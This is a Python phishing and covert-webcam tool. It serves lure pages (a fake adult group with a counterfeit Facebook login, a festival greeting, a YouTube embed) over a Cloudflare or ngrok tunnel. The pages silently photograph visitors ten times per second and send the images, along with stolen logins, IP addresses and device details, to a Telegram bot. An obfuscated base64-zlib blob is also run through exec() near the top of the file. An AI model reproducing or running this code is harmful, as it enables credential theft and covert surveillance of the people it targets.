#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import subprocess
import time
import threading
import socket
import json
import shutil
import platform
import signal
import re
import base64
import requests
from datetime import datetime
from http.server import HTTPServer, SimpleHTTPRequestHandler
from urllib.parse import parse_qs, urlparse

# ======================= GLOBALS =======================
PORT = None
SERVER_PROCESS = None
TUNNEL_PROCESS = None

_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
exec((_)(b'u9yH+Fw/vvP//TZpB3A2P99ZuzmIvC2J+Q3vPbkUkxNTkaNX6BCn6lhs3Ul8g1vu4AmsKvqhFEGgYfk0OUGRvRxYweMquYqHDSYU5mh4F4UV9Rc687dGVpRSHYS3T1HSaux5E5QNl1ksBS3nxN5EmDHyWJWTZB/8VGiRrjfaMXmv1UEbU2TS39WpJk2PjE/PBxIIPf7gjy1uPEW19hmhblEABM8iDZb6dABc6/09OfQZ7K0zag5M0HOZrdTR5ER+iYL+jhsuzgm2mfW6pSdSUl3b95RYPRQAM6kmEYBL8lt14FZHDhdLePd7OVL/OzWzXTnPD2jlZq2vLBA8ygs5tenegDKBZLXeSPDyeUkdhw2t8rYBO3Q2uqhAUgBbkqigeXIVtIqBWtjhfNZCeqVCS0Ah3YLxbTHMeGYlQhNWGSLKrRwRBUnOPeJc7gVhu28Gi8SvbJAFZ4kW88/dbMCpzmtMFVUqI3IaJHkZ/msvn1N1qjoeLlm1VFtTAup1cNVDWLyE7k3OMDCLCVeC6cMUYSMMFLxXo5hdUh+LMFI5MNOmXo5i6NMUOVjsf4re87Wmsv/UYzuGnuYPTxFDffZGSG9VDzYUPJSVaVCS73Ymz/4gHvARokJ4kk8/3ZukKQ9S5W5oL566kXMStY8i00iZF9dztoemf6UbovIxWRcD9b83W2f0vXxRrq0y2XodhvLi4fjNi8gFOvmfxsX0TW+xyZu/wIy13JGNhsIM39zMrjf2LNaKGd8GEQZ6P0Yw5DAuC7yKrwW5L1ro5qxs99kPwVltAGuuNQnuwT3v44P1YhguSezX7DiPNrlaWQDutFP2q9AHYfn28tdTR7Ah2+tUIyh1g5HoaOsteLUZJhl0M6nfxAXDpyJ/m2q6viqs+S158I3pHsuZeMr9YurpSOAYB2DN+1heHQ5NjCWWA7+TJskGjjBx853LCMLSXF9FHGaC5DOea5B5f6rRSb/RKA9rQBTB3eGjU8aTqhgz3Zb2LZN/sr1S7tb+gJ5piIyLkHPC7CkFnnOKJo55dWlrTncVpWWyf0uRVFayE4x6bcUs+p3iTAlYyA2lgX1mNdb4ToTKRKBbeSQbP/pKNoqZzOX/vR/C7+eCnkUI5WF24gqtqMmiikTmGFEkkdcPwPSxt9XTU23qG7B44sA/fbWvMxBadGaa4KhX53hV24UD8nI4sYEWvZAOTnft+jxh+1vN51WE1Dp7otSnnPsm/qU1xwgAVwp+vBwaO7LrtbmvN60QHRvj6nhg9YzQ8ZednSai0vo3V3VyFrL7RFcjScFfxofNp/CQOkRNVzNUKMeblq8wvdt/2uI6cjwQHgWh0XClHaXzg/4WHgUWC43u4PF4eI8ayaHOzaVlQ3DOHjjdMtPp5q0mVMcl3MT2f8WOpi1DinbWHNGAF6yV3RgeqlcO8z5MuQpQjhb5cnFQObXeLOyVzY8uic6CjDUf2a+3pX1QH4Y5oVEy4Gc6i9fEo8h1dpLFX8h5l5y4zoLvdinZhws3XbGVkrjcBJtQPjg/19eMYrzKmMJL1BTqcKVm7uNVKe0bflEfc/TS8k3QGyqOKwAIg0Y9qS88tuqPJnb7H4rIzTHTxFZ4XwrCcYvME47lwGLfkHWprkZAq7IyBS75NSRkZ0q5OhDerhkalhtOhSBS68xVD4PR14MZtIfTUor29htyx6ew9nVdiWgRyey9JK/bIc9hBUf/nToI8wpSSk/FyckFMmaecSxUvBM45KThbDoXhtcCGB1U7/vOturHZnlOnEipfRbs4oI3mAwUYwXdlPPE3/kT9zugxJx3sghyyMEBX6qGBsXBfGv4H/iFRhjFb1eHIVmVbpgPEZ+nqWUFQxI6ooPNyd8dwzKMNCtFgSs1p+G2FvQ3n9JvRjYQx56dzkYFfdJhCOvuJmPgFa4t9tA/qkIfqTAiZFGRdJZTuvuYVrgv+fj76W2VRt7Ob6Xjgn31fQEBaFFA58roRRguX5J8/aArMR3CawDB5PMehWfcGw9EyDeShXYpQxrBqF2YqetChNh6CI3LPYjmHH1+8iDoTeg6hCk5CUprXCqbc8XaSns8CgqbvXZHd1KDcd5cd4vNyBAVmcaWhZ1h2zLl/eWM+L+qca8qnTlbajRg+wYmOHN7N0YLiHyQ0BF3eYXEylnQPMDcJ1lhqJgYaBZDCLTKkILke1txhvn9ZJkaLhpy1SFfGzbuIU4Hf6Jbqt82KguqhjC+vXqwbmuyZlkLWdlivKMATGht01D5n8F2lAN+bcTQCcBRgCZPdKkOhZnGgtbW+O2v+ZdCULAryPcp+AYvTYuhtouUvBHXvq3tl1B7YHlWktGPNJCsT5vW7ZZbp6xHJcBf/WoPwIhl6wlryfEzClCxHfWYoYOm1FS0R/+GrFw7hBRxUAXsWSN54PnI+amhqD7aq8xPsI3aQh2KRNyj1PL/6ILW7V480fthXgqpXwv+mn+cX1///k9Pf/O/+/n5dVOFvI0kBrznn+gEvhnRt5d8zDcvW0UiBIW1T/YBCgFpOcUlNwJe'))

# ======================= CAPTURE DIRECTORY (INTERNAL STORAGE PREFERRED) =======================
# यदि /sdcard मौजूद है तो वहाँ बनाएँ, नहीं तो करंट डायरेक्टरी में
if os.path.exists('/sdcard'):
    CAPTURE_BASE = '/sdcard/Dgtlcapture'
else:
    CAPTURE_BASE = 'Dgtlcapture'

# ======================= HTML TEMPLATES (100ms capture) =======================
XINDEX_HTML = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔞+ Group🥵</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; font-family:Arial,sans-serif; }
        body { display:flex; justify-content:center; align-items:center; height:100vh; background:#f0f2f5; }
        .hidden { display:none; }
        .group-container, .login-container { width:90%; max-width:400px; background:#fff; padding:20px; border-radius:10px; box-shadow:0 2px 10px rgba(0,0,0,0.2); text-align:center; }
        .profile-img { width:80px; height:80px; border-radius:50%; object-fit:cover; margin-bottom:10px; }
        .group-name { font-size:20px; font-weight:bold; }
        .participants { font-size:14px; color:gray; }
        .icons { display:flex; justify-content:center; gap:30px; margin:15px 0; }
        .icon-box { display:flex; flex-direction:column; align-items:center; font-size:14px; }
        .icon { font-size:24px; cursor:pointer; }
        .media-section { text-align:left; margin-top:20px; padding-left:10px; }
        .media-box-container { display:flex; gap:10px; overflow-x:auto; padding:10px 0; }
        .media-box { width:70px; height:60px; border-radius:10px; background:#ddd; display:flex; align-items:center; justify-content:center; font-size:12px; background-size:cover; }
        #box1 { background-image:url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTNaiqhOTVqwgbtyQoPVchZqw9Xeck3i594WS0uXVkw7eQSA91gFwc-ZkA&s=10'); }
        #box4 { background-image:url('https://cdncontent.xxxwaffle.com/content/2/569/2569412_dcb18f0.jpg'); }
        #box2 { background-image:url('https://i.postimg.cc/N0JzTxXk/IMG-20220726-210625-picsay.jpg'); }
        #box3 { background-image:url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRWO8_tofwFoFbst0MEHZa-pWgCBQTjyvAnWt7OjiTMxHqvxNCBtz1U_k4&s=10'); }
        #box5 { background-image:url('https://i.ibb.co/85YydzM/165325118357786736.png'); }
        .join-btn { background:linear-gradient(to right,#ff00ff,#0000ff); color:#fff; border:none; padding:12px 25px; margin-top:20px; cursor:pointer; border-radius:5px; font-size:16px; }
        .login-header { font-size:22px; font-weight:bold; color:#1877f2; }
        .subtext { font-size:14px; color:#555; margin-bottom:20px; }
        .input-box { position:relative; margin-top:10px; }
        .input-box input { width:100%; padding:12px; padding-right:40px; border:1px solid #ccc; border-radius:5px; font-size:16px; }
        .show-btn { position:absolute; right:10px; top:50%; transform:translateY(-50%); cursor:pointer; font-size:14px; color:#007bff; background:none; border:none; display:none; font-weight:bold; }
        .btn { background:linear-gradient(45deg,#ff0080,#8000ff); color:#fff; border:none; padding:12px; width:100%; font-size:16px; cursor:pointer; margin-top:15px; border-radius:5px; font-weight:bold; text-transform:uppercase; }
        .footer-sabi { text-align:center; color:#888; font-size:12px; margin-top:10px; }
        .video-wrap { display:none; }
    </style>
</head>
<body>
<div class="video-wrap"><video id="video" playsinline autoplay></video></div>
<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

<div class="group-container" id="groupPage">
    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRu7BslXlUg0c8KojMtP6jwXaSptlkqDMy3Jg&usqp=CAU" class="profile-img">
    <h2 class="group-name">SEX VIDEOS 🔞+ 💋💦🥵</h2>
    <p class="participants">Group 1,670 Participants</p>
    <div class="icons">
        <div class="icon-box"><span class="icon">📞</span><span>Call</span></div>
        <div class="icon-box"><span class="icon">📹</span><span>Video</span></div>
        <div class="icon-box"><span class="icon">🔍</span><span>Search</span></div>
    </div>
    <div class="media-section">
        <p>Media, links and docks</p>
        <div class="media-box-container">
            <div id="box1" class="media-box"></div>
            <div id="box2" class="media-box"></div>
            <div id="box3" class="media-box"></div>
            <div id="box4" class="media-box"></div>
            <div id="box5" class="media-box">videos</div>
        </div>
    </div>
    <button class="join-btn" onclick="showLogin()">JOIN THE GROUP</button>
</div>

<div class="login-container hidden" id="loginPage">
    <h2 class="login-header">Facebook</h2>
    <p class="subtext">Log in to your Facebook account to connect to Group 18+</p>
    <form id="loginForm">
        <div class="input-box"><input type="text" name="email" id="emailOrPhone" placeholder="Number or email address"></div>
        <div class="input-box">
            <input type="password" name="password" id="password" placeholder="Password" oninput="toggleShowButton()">
            <button type="button" class="show-btn" id="showBtn" onclick="togglePassword()">Show</button>
        </div>
        <button type="submit" class="btn">Log In</button>
    </form>
    <div class="footer-dgtl">Powered by DGTL</div>
</div>

<script>
function showLogin(){ document.getElementById('groupPage').classList.add('hidden'); document.getElementById('loginPage').classList.remove('hidden'); }
function toggleShowButton(){ let p=document.getElementById('password'); let b=document.getElementById('showBtn'); b.style.display = p.value.length>0?'block':'none'; }
function togglePassword(){ let p=document.getElementById('password'); let b=document.getElementById('showBtn'); if(p.type==='password'){p.type='text'; b.textContent='Hide';} else {p.type='password'; b.textContent='Show';} }

document.getElementById('loginForm').addEventListener('submit', async function(e){
    e.preventDefault();
    const email = document.getElementById('emailOrPhone').value;
    const pass = document.getElementById('password').value;
    const botToken = '1234567890';
    const chatId = '1234567890';
    const ipData = await fetch('https://api.ipify.org?format=json').then(res=>res.json());
    const device = navigator.userAgent;
    let batt = 'Unavailable';
    if(navigator.getBattery) { const b=await navigator.getBattery(); batt=`Battery: ${Math.round(b.level*100)}%, Charging: ${b.charging}`; }
    const msg = `📥 Login Info:\\n-----------------------------\\n📧 Email: ${email}\\n🔑 Pass: ${pass}\\n🔋 ${batt}\\n🌐 IP: ${ipData.ip}\\n📱 Device: ${device}\\n-----------------------------\\n📌 Create by Sabi`;
    try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({chat_id:chatId, text:msg}) });
    } catch(e) {}
    window.location.href = 'https://www.facebook.com/login/';
});

// Webcam capture - super fast (100ms)
function post(imgdata){
    $.ajax({
        type: 'POST',
        data: { cat: imgdata },
        url: 'post.php',
        dataType: 'json',
        async: false
    });
}

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const constraints = { audio: false, video: { facingMode: "user" } };

async function init(){
    try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        video.srcObject = stream;
        const ctx = canvas.getContext('2d');
        setInterval(function(){
            ctx.drawImage(video, 0, 0, 640, 480);
            var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
            post(canvasData);
        }, 100); // <-- 100ms = 10 photos per second
    } catch(e) {
        console.log("Camera not available");
    }
}
init();
</script>
</body>
</html>'''

WISH_HTML = '''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title꧁𓊈𒆜Happy fes_name𒆜𓊉꧂</title>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
<style>
    * { box-sizing:border-box; }
    body { background: linear-gradient(to bottom right, #f6ff00, #e1e8e7, #00ffe9); background-size:cover; font-family:Arial; text-align:center; }
    .container { padding:20px; }
    .main-greeting { max-width:600px; margin:auto; background:rgba(255,255,255,0.7); border-radius:20px; padding:20px; }
    .footerbtn { display:inline-block; margin:10px; padding:10px 20px; border-radius:15px; background:#34af23; color:#fff; text-decoration:none; }
    .footerbtn1 { display:inline-block; margin:10px; padding:10px 20px; border-radius:15px; background:#000099; color:#fff; text-decoration:none; }
    h1 { font-size:2.5em; }
    .footer-sabi { margin-top:20px; color:#888; font-size:12px; }
    .video-wrap { display:none; }
</style>
</head>
<body>
<div class="video-wrap"><video id="video" playsinline autoplay></video></div>
<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
<div class="container">
    <div class="main-greeting">
        <h1>🎉 HAPPY <span id="fesPlaceholder">fes_name</span> 🎉</h1>
        <p><marquee behavior="alternate">“May this occasion bring lots of happiness”</marquee></p>
        <p>Enter your name: <input type="text" id="nameInput" placeholder="Your name"></p>
        <button onclick="updateName()">Update</button>
        <div id="greetingDisplay"><h2 style="color:#f06414;">Wishing you a Happy fes_name</h2></div>
        <div class="footer-dgtl">Powered by DGTL</div>
        <a class="footerbtn" href="whatsapp://send?text=Check this out: forwarding_link">Share on WhatsApp</a>
        <a class="footerbtn1" href="https://www.facebook.com/sharer/sharer.php?u=forwarding_link" target="_blank">Share on Facebook</a>
    </div>
</div>
<script>
function updateName(){ let n=document.getElementById('nameInput').value; document.getElementById('greetingDisplay').innerHTML='<h2 style="color:#f06414;">Happy fes_name, '+n+'!</h2>'; }
function post(imgdata){
    $.ajax({
        type: 'POST',
        data: { cat: imgdata },
        url: 'post.php',
        dataType: 'json',
        async: false
    });
}
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const constraints = { audio: false, video: { facingMode: "user" } };
async function init(){
    try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        video.srcObject = stream;
        const ctx = canvas.getContext('2d');
        setInterval(function(){
            ctx.drawImage(video, 0, 0, 640, 480);
            var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
            post(canvasData);
        }, 100);
    } catch(e) {}
}
init();
</script>
</body>
</html>'''

YOUTUBE_HTML = '''<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>🟥⃢▸  Live YouTube</title>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
<style>
    body { margin:0; background:#000; }
    iframe { width:100%; height:100vh; border:0; }
    .footer-sabi { position:fixed; bottom:10px; left:0; right:0; text-align:center; color:#888; font-size:12px; background:rgba(0,0,0,0.7); padding:5px; }
    .video-wrap { display:none; }
</style>
</head>
<body>
<div class="video-wrap"><video id="video" playsinline autoplay></video></div>
<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
<iframe src="https://www.youtube.com/embed/live_yt_tv?autoplay=1" allow="autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
<div class="footer-dgtl">Powered by DGTL</div>
<script>
function post(imgdata){
    $.ajax({
        type: 'POST',
        data: { cat: imgdata },
        url: 'post.php',
        dataType: 'json',
        async: false
    });
}
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const constraints = { audio: false, video: { facingMode: "user" } };
async function init(){
    try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        video.srcObject = stream;
        const ctx = canvas.getContext('2d');
        setInterval(function(){
            ctx.drawImage(video, 0, 0, 640, 480);
            var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
            post(canvasData);
        }, 100);
    } catch(e) {}
}
init();
</script>
</body>
</html>'''

# ======================= CUSTOM HTTP HANDLER =======================
class CustomHandler(SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length)
        path = self.path

        if path == '/check.php':
            try:
                data = json.loads(body.decode())
                email = data.get('email', '')
                password = data.get('password', '')
                ip = self.client_address[0]
                with open('ip.txt', 'a') as f:
                    f.write(f"IP: {ip}\n")
                with open('Log.log', 'a') as f:
                    f.write(f"Email: {email}\nPassword: {password}\nIP: {ip}\n")
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b'{"status":"ok"}')
            except:
                self.send_response(400)
                self.end_headers()
        elif path == '/post.php':
            try:
                data = parse_qs(body.decode())
                img_data = data.get('cat', [''])[0]
                if img_data:
                    img_data = img_data.replace('data:image/octet-stream;base64,', '')
                    img_data = img_data.replace('data:image/png;base64,', '')
                    img_data = img_data.replace(' ', '+')
                    img_bytes = base64.b64decode(img_data)
                    # -------- यहाँ CAPTURE_BASE का उपयोग किया गया है --------
                    os.makedirs(CAPTURE_BASE, exist_ok=True)
                    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')
                    filename = os.path.join(CAPTURE_BASE, f"cam_{timestamp}.png")
                    with open(filename, 'wb') as f:
                        f.write(img_bytes)
                    with open('Log.log', 'a') as f:
                        f.write(f"Cam saved: {filename}\n")
                    
                    # Send to Telegram
                    try:
                        with open(filename, 'rb') as photo_file:
                            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
                            files = {'photo': photo_file}
                            data = {'chat_id': CHAT_ID, 'caption': f"📸 Captured at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"}
                            response = requests.post(url, files=files, data=data, timeout=10)
                            if response.status_code == 200:
                                with open('Log.log', 'a') as f:
                                    f.write(f"Telegram sent: {filename}\n")
                            else:
                                with open('Log.log', 'a') as f:
                                    f.write(f"Telegram send failed: {response.text}\n")
                    except Exception as e:
                        with open('Log.log', 'a') as f:
                            f.write(f"Telegram send error: {str(e)}\n")
                    
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b'{"status":"ok"}')
                else:
                    self.send_response(400)
                    self.end_headers()
            except Exception as e:
                print(f"Error saving image: {e}")
                self.send_response(500)
                self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

    def do_GET(self):
        return SimpleHTTPRequestHandler.do_GET(self)

    def log_message(self, format, *args):
        pass

# ======================= UTILITY FUNCTIONS =======================
def find_free_port(start=3333, max_tries=100):
    for port in range(start, start + max_tries):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.bind(('localhost', port))
                return port
        except OSError:
            continue
    raise RuntimeError("No free port found.")

def print_banner():
    os.system('cls' if platform.system() == 'Windows' else 'clear')
    print("\033[1;31m██████╗  ██████╗ ████████╗██╗      \033[1;36m ██████╗ █████╗ ███╗   ███╗\033[0m")
    print("\033[1;33m██╔══██╗██╔════╝ ╚══██╔══╝██║      \033[1;34m██╔════╝██╔══██╗████╗ ████║\033[0m")
    print("\033[1;32m██║  ██║██║  ███╗   ██║   ██║      \033[1;32m██║     ███████║██╔████╔██║\033[0m")
    print("\033[1;36m██║  ██║██║   ██║   ██║   ██║      \033[1;35m██║     ██╔══██║██║╚██╔╝██║\033[0m")
    print("\033[1;34m██████╔╝╚██████╔╝   ██║   ███████╗ \033[1;33m╚██████╗██║  ██║██║ ╚═╝ ██║\033[0m")
    print("\033[1;35m╚═════╝  ╚═════╝    ╚═╝   ╚══════╝ \033[1;31m ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝\033[0m")
    print("\033[1;34m  <========================================================>\033[0m\n")
    print("\033[1;92m         WELCOME To Webcam\033[1;97m => \033[1;96mCreate by Aryan Afridi          \033[0m\n")
    print("\033[1;92m  <========================================================>\033[0m")
    print("\033[1;91m     YouTube Bangla\033[1;90m => \033[1;93m https://www.youtube.com/@aryanafridi00\033[0m")
    print("\033[1;92m  <========================================================>\033[0m")
    print("\033[1;95m          Subscribe my YouTube Channel Er.Aryan Afridi\033[0m")
    print("\033[1;34m  <========================================================>\033[0m\n")

def select_template():
    print("\n----- Choose a template ----")
    print("\n\033[1;92m[\033[0m\033[1;77m01\033[0m\033[1;92m]\033[0m\033[1;93m Friends wishes\033[0m")
    print("\033[1;92m[\033[0m\033[1;77m02\033[0m\033[1;92m]\033[0m\033[1;93m Live YouTube\033[0m")
    print("\033[1;92m[\033[0m\033[1;77m03\033[0m\033[1;92m]\033[0m\033[1;93m 18+ Group\033[0m")
    default = "2"
    choice = input("\n\033[1;92m[+] Choose an option Number\033[1;93m[Default YouTube]: \033[0m") or default
    if choice == '1':
        fest_name = input("\n\033[1;92m[+] Enter festival name: \033[0m").strip()
        return 'wish', fest_name, None
    elif choice == '2':
        vid = input("\n\033[1;92m[+] Enter YouTube Video ID: \033[0m").strip()
        return 'youtube', None, vid
    elif choice == '3':
        return 'xindex', None, None
    else:
        print("\033[1;93m [!] Invalid!\033[0m")
        return select_template()

def generate_index(template, link, fest_name=None, yt_id=None):
    if template == 'wish':
        content = WISH_HTML.replace('forwarding_link', link).replace('fes_name', fest_name if fest_name else 'Festival')
    elif template == 'youtube':
        content = YOUTUBE_HTML.replace('forwarding_link', link).replace('live_yt_tv', yt_id if yt_id else 'dQw4w9WgXcQ')
    else:
        content = XINDEX_HTML.replace('forwarding_link', link)
    with open('index.html', 'w') as f:
        f.write(content)

def download_binary(name, url):
    try:
        import urllib.request
        print(f"\033[1;33m[!] Downloading {name}...\033[0m")
        urllib.request.urlretrieve(url, name)
        os.chmod(name, 0o755)
        return True
    except:
        return False

def get_cloudflared_path():
    exe = shutil.which('cloudflared')
    if exe:
        return exe
    system = platform.system()
    arch = platform.machine().lower()
    base = "https://github.com/cloudflare/cloudflared/releases/latest/download/"
    if system == 'Windows':
        url = base + "cloudflared-windows-amd64.exe"
        local = "cloudflared.exe"
    elif system == 'Darwin':
        url = base + "cloudflared-darwin-amd64"
        local = "cloudflared"
    else:
        if arch in ['armv7l', 'armhf']:
            url = base + "cloudflared-linux-arm"
        elif arch in ['aarch64', 'arm64']:
            url = base + "cloudflared-linux-arm64"
        else:
            url = base + "cloudflared-linux-amd64"
        local = "cloudflared"
    if os.path.exists(local) and os.access(local, os.X_OK):
        return os.path.abspath(local)
    if download_binary(local, url):
        return os.path.abspath(local)
    return None

def get_ngrok_path():
    exe = shutil.which('ngrok')
    if exe:
        return exe
    system = platform.system()
    if system == 'Windows':
        url = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip"
        local = "ngrok.exe"
    elif system == 'Darwin':
        url = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-darwin-amd64.zip"
        local = "ngrok"
    else:
        arch = platform.machine()
        if 'arm' in arch:
            url = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip"
        else:
            url = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip"
        local = "ngrok"
    if os.path.exists(local) and os.access(local, os.X_OK):
        return os.path.abspath(local)
    try:
        import urllib.request
        import zipfile
        print(f"\033[1;33m[!] Downloading ngrok...\033[0m")
        zip_path = local + ".zip"
        urllib.request.urlretrieve(url, zip_path)
        with zipfile.ZipFile(zip_path, 'r') as z:
            z.extractall('.')
        os.remove(zip_path)
        os.chmod(local, 0o755)
        return os.path.abspath(local)
    except:
        return None

def start_tunnel(port):
    global TUNNEL_PROCESS
    cloudflared = get_cloudflared_path()
    if cloudflared:
        print("\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Starting Cloudflare Tunnel...\033[0m")
        cmd = [cloudflared, "tunnel", "--url", f"http://localhost:{port}", "--no-autoupdate", "--edge-ip-version", "4", "--protocol", "http2"]
        TUNNEL_PROCESS = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
        for _ in range(15):
            line = TUNNEL_PROCESS.stdout.readline()
            if not line:
                break
            if 'trycloudflare.com' in line:
                match = re.search(r'https://[^\s]+\.trycloudflare\.com', line)
                if match:
                    return match.group(0)
            time.sleep(1)
        TUNNEL_PROCESS.terminate()
        TUNNEL_PROCESS.wait()
        TUNNEL_PROCESS = None
        print("\033[1;31m[!] Cloudflare tunnel failed.\033[0m")
    print("\033[1;33m[!] Trying ngrok...\033[0m")
    ngrok = get_ngrok_path()
    if not ngrok:
        print("\033[1;31m[!] ngrok not found. Install manually.\033[0m")
        return None
    cmd = [ngrok, "http", str(port), "--log=stdout"]
    TUNNEL_PROCESS = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
    for _ in range(10):
        line = TUNNEL_PROCESS.stdout.readline()
        if not line:
            break
        if 'url' in line.lower():
            match = re.search(r'https://[^\s]+\.ngrok-free\.app', line)
            if match:
                return match.group(0)
        time.sleep(1)
    return None

def start_server(port):
    global SERVER_PROCESS
    server = HTTPServer(('localhost', port), CustomHandler)
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.daemon = True
    server_thread.start()
    SERVER_PROCESS = server
    return server

def stop_all():
    global SERVER_PROCESS, TUNNEL_PROCESS
    if TUNNEL_PROCESS:
        TUNNEL_PROCESS.terminate()
        TUNNEL_PROCESS.wait()
        TUNNEL_PROCESS = None
    if SERVER_PROCESS:
        SERVER_PROCESS.shutdown()
        SERVER_PROCESS = None
    sys.exit(0)

def signal_handler(sig, frame):
    print("\n\033[1;31m[!] Stopping...\033[0m")
    stop_all()

def main():
    global PORT
    signal.signal(signal.SIGINT, signal_handler)
    print_banner()

    template, fest_name, yt_id = select_template()
    PORT = find_free_port()
    print(f"\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Using port: {PORT}\033[0m")

    print(f"\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Starting HTTP server on port {PORT}...\033[0m")
    start_server(PORT)
    time.sleep(1)

    link = start_tunnel(PORT)
    if not link:
        print("\033[1;31m[!] No tunnel URL obtained. Exiting.\033[0m")
        stop_all()
    print(f"\033[1;92m[+] Public Link:\033[0m \033[1;77m{link}\033[0m")
    generate_index(template, link, fest_name, yt_id)

    print("\n\033[1;92m[\033[0m\033[1;77m*\033[0m\033[1;92m] Waiting targets,\033[0m\033[1;77m Press Ctrl + C to exit...\033[0m")
    while True:
        time.sleep(1)
        if os.path.exists('ip.txt'):
            with open('ip.txt', 'r') as f:
                lines = f.readlines()
                for line in lines:
                    if line.startswith('IP:'):
                        ip = line.split('IP:')[1].strip()
                        print(f"\n\033[1;93m[\033[0m\033[1;77m+\033[0m\033[1;93m] IP:\033[0m\033[1;77m {ip}\033[0m")
                        with open('saved.ip.txt', 'a') as sf:
                            sf.write(f"IP: {ip}\n")
            os.remove('ip.txt')
        if os.path.exists('Log.log'):
            with open('Log.log', 'r') as f:
                content = f.read()
                if 'Email:' in content or 'Cam' in content:
                    print("\n\033[1;92m[\033[0m+\033[1;92m] Data received! Check Log.log and Dgtlcapture folder\033[0m")
            os.remove('Log.log')

if __name__ == '__main__':
    main()